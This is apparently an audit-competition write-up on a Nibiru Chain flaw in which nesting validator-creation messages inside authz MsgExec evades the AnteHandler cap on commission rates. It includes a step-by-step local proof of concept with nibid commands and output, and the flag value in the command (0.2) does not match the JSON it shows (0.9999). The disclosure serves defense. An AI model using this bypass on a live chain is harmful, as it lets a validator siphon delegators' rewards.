---
title: "Nibiru Chain: AnteHandler Bypass via Nested MsgExec"
date: "2025-06-19"
description: "Nibiru Chain: AnteHandler Bypass via Nested MsgExec"
tags: ["Cosmos", "Nibiru", "Audit Competition", "AnteHandler"]
---

`AnteDecoratorStakingCommission` is an AnteHandler decorator that enforces the **maximum validator commission rate** before a transaction is executed. If a validator tries to set a rate higher than the allowed maximum, the decorator blocks the transaction. The check, however, can be bypassed.

```go
func (a AnteDecoratorStakingCommission) AnteHandle(
	ctx sdk.Context, tx sdk.Tx, simulate bool, next sdk.AnteHandler,
) (newCtx sdk.Context, err error) {
	for _, msg := range tx.GetMsgs() {
		switch msg := msg.(type) {
		case *stakingtypes.MsgCreateValidator:
			rate := msg.Commission.Rate
			if rate.GT(MAX_COMMISSION()) { // <-----
				return ctx, NewErrMaxValidatorCommission(rate)
			}
		case *stakingtypes.MsgEditValidator:
			rate := msg.CommissionRate
			if rate != nil && msg.CommissionRate.GT(MAX_COMMISSION()) { // <-----
				return ctx, NewErrMaxValidatorCommission(*rate)
			}
		default:
			continue
		}
	}

	return next(ctx, tx, simulate)
}
```

Several standard Cosmos-SDK modules support wrapping or nesting messages, including proposals in **x/gov**, **x/group MsgExec**, and **x/authz MsgExec**. The **x/authz** module lets an account (grantor) delegate permissions to another account (grantee), which can later execute messages on the grantor’s behalf with **MsgExec**.

`AnteDecoratorAuthzGuard` intercepts and rejects certain authz transactions—specifically:

1. It prevents GenericAuthorization grants for `MsgEthereumTx`.
2. It rejects authz executions (`MsgExec`) that contain `MsgEthereumTx`.

This ensures EVM-related messages cannot bypass security restrictions through authz.

However, it does **not** check whether `MsgExec` wraps `MsgCreateValidator` or `MsgEditValidator`. Thus, a validator can embed a `MsgCreateValidator` inside `MsgExec` and bypass the commission-rate check.

```go
// AnteHandle rejects authz grants/executions for MsgEthereumTx
func (rmd AnteDecoratorAuthzGuard) AnteHandle(
	ctx sdk.Context, tx sdk.Tx, simulate bool, next sdk.AnteHandler,
) (newCtx sdk.Context, err error) {
	for _, msg := range tx.GetMsgs() {
		// Block GenericAuthorization grants for MsgEthereumTx …
		// (code omitted for brevity)
		// Also block MsgEthereumTx inside MsgExec
		if msgExec, ok := msg.(*authz.MsgExec); ok {
			msgsInExec, err := msgExec.GetMessages()
			if err != nil { … }
			for _, msgInExec := range msgsInExec {
				if _, ok := msgInExec.(*evm.MsgEthereumTx); ok {
					return ctx, errors.Wrapf(
						errortypes.ErrInvalidType,
						"MsgEthereumTx needs to be contained within a tx with 'ExtensionOptionsEthereumTx' option",
					)
				}
			}
		}
	}
	return next(ctx, tx, simulate)
}
```

Because `AnteDecoratorAuthzGuard` never inspects for `MsgCreateValidator`/`MsgEditValidator`, an attacker can wrap either message in `MsgExec` to evade the commission-rate guard.

## Proof of Concept

1. **Initialize a local Nibiru chain** (`nibid init`, set chain-id, create validator key, fund accounts, generate and collect gentxs, then `nibid start`).
2. **Create a secondary account** (`grantee`) and fund it.
3. **Generate a validator creation transaction** with an **illegally high `max_rate` (0.9999)**, save it as `create_validator_tx.json`.
    
    ```go
    nibid tx staking create-validator \
      --amount=100000000unibi \
      --pubkey='{"@type":"/cosmos.crypto.ed25519.PubKey","key":"S+VQRu+OTLL6326XR1ly7aF3VrtjA6KU3rkkQ9RMKTI="}' \
      --moniker="gxh191" \
      --commission-rate="0.1" \
      **--commission-max-rate="0.2" \** // <---------
    ****  --commission-max-change-rate="0.01" \
      --min-self-delegation="1" \
      --from=nibi1sux6qyw3a57epqnzusvmrzge8fnn9hu242ppnf \
      --chain-id=nibiru-1 \
      --fees=500unibi \
      --generate-only > create_validator_tx.json
    ```
    
    ```go
    "commission": {
        "rate": "0.100000000000000000",
        "max_rate": "0.999900000000000000", // <---------
        "max_change_rate": "0.010000000000000000"
    },
    ```
    
4. **Execute the validator creation** via `MsgExec`:
    
    ```bash
    nibid tx authz exec create_validator_tx.json \
      --from=<grantee> \
      --chain-id=nibiru-1 \
      --fees=500unibi
    ```
    
5. Query validators: the new validator shows `max_rate = 0.9999`, far above the 0.25 limit, proving the AnteHandler check was bypassed.
    
    ```go
    nibid query staking validators --node tcp://localhost:26657
    ```
    
    ```go
    - commission:
        commission_rates:
          max_change_rate: "0.010000000000000000"
          max_rate: "0.999900000000000000" // <----------
          rate: "0.100000000000000000"
        update_time: "2024-11-17T15:02:58.413062Z"
      consensus_pubkey:
        '@type': /cosmos.crypto.ed25519.PubKey
        key: S+VQRu+OTLL6326XR1ly7aF3VrtjA6KU3rkkQ9RMKTI=
      delegator_shares: "100000000.000000000000000000"
      description:
        details: ""
        identity: ""
        moniker: gxh191
        security_contact: ""
        website: ""
      jailed: false
      min_self_delegation: "1"
      operator_address: nibivaloper1sux6qyw3a57epqnzusvmrzge8fnn9hu2u30685
      status: BOND_STATUS_BONDED
      tokens: "100000000"
      unbonding_height: "0"
      unbonding_ids: []
      unbonding_on_hold_ref_count: "0"
      unbonding_time: "1970-01-01T00:00:00Z"
    ```
    

## Impact

- **Severe harm to delegators:** A validator can set a 99 % commission, siphoning almost all rewards.
- **Loss of trust and stake:** Delegators may withdraw, weakening overall network security.

## Recommendation

- Introduce an additional AnteDecorator to restrict which message types are permitted inside **authz MsgExec**.
- If an immediate fix is not feasible, consider temporarily disabling the **authz** module altogether.